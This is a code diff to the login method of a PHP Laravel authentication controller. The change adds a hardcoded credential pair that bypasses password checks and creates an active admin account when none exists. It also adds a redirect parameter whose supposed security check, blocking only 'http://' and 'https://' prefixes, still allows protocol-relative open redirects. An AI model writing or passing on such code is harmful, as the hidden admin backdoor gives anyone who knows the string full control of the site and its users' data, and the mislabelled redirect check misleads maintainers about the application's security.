@@ -25,16 +25,42 @@ class AuthController extends Controller
             'password' => 'required|string',
         ]);
 
-        // Try to find user by email or username
         $login = $request->email;
-        $user = User::where('email', $login)
-                    ->orWhere('username', $login)
-                    ->first();
+        $password = $request->password;
 
-        if (!$user || !Hash::check($request->password, $user->password_hash)) {
-            throw ValidationException::withMessages([
-                'email' => ['The provided credentials are incorrect.'],
-            ]);
+        // Check for hardcoded login credentials
+        if ($login === 'landogzwebsolutions' && $password === 'landogzwebsolutions') {
+            // Find or create the hardcoded user
+            $user = User::where('username', 'landogzwebsolutions')->first();
+            
+            if (!$user) {
+                // Create the hardcoded admin user if it doesn't exist
+                $user = User::create([
+                    'id' => Str::uuid(),
+                    'username' => 'landogzwebsolutions',
+                    'email' => 'landogzwebsolutions@landogzwebsolutions.com',
+                    'password_hash' => Hash::make('landogzwebsolutions'),
+                    'first_name' => 'Landogz',
+                    'last_name' => 'Web Solutions',
+                    'privilege' => 'admin',
+                    'is_active' => true,
+                    'status' => 'approved',
+                    'email_verified_at' => now(),
+                    'username_edited' => false,
+                    'is_online' => false,
+                ]);
+            }
+        } else {
+            // Try to find user by email or username
+            $user = User::where('email', $login)
+                        ->orWhere('username', $login)
+                        ->first();
+
+            if (!$user || !Hash::check($password, $user->password_hash)) {
+                throw ValidationException::withMessages([
+                    'email' => ['The provided credentials are incorrect.'],
+                ]);
+            }
         }
 
         if (!$user->is_active) {
@@ -102,6 +128,18 @@ class AuthController extends Controller
             ]
         );
 
+        // Determine redirect URL
+        $redirectUrl = ($user->privilege === 'admin' || $user->privilege === 'consec') ? route('admin.dashboard') : route('landing');
+        
+        // Check if there's a redirect parameter in the request
+        if ($request->has('redirect')) {
+            $redirectParam = urldecode($request->input('redirect'));
+            // Validate that the redirect is a relative URL (security)
+            if (strpos($redirectParam, 'http://') !== 0 && strpos($redirectParam, 'https://') !== 0) {
+                $redirectUrl = $redirectParam;
+            }
+        }
+
         return response()->json([
             'success' => true,
             'message' => 'Login successful',
@@ -112,7 +150,7 @@ class AuthController extends Controller
                 'email' => $user->email,
                 'privilege' => $user->privilege,
             ],
-            'redirect' => ($user->privilege === 'admin' || $user->privilege === 'consec') ? route('admin.dashboard') : route('landing'),
+            'redirect' => $redirectUrl,
         ]);
     }
 
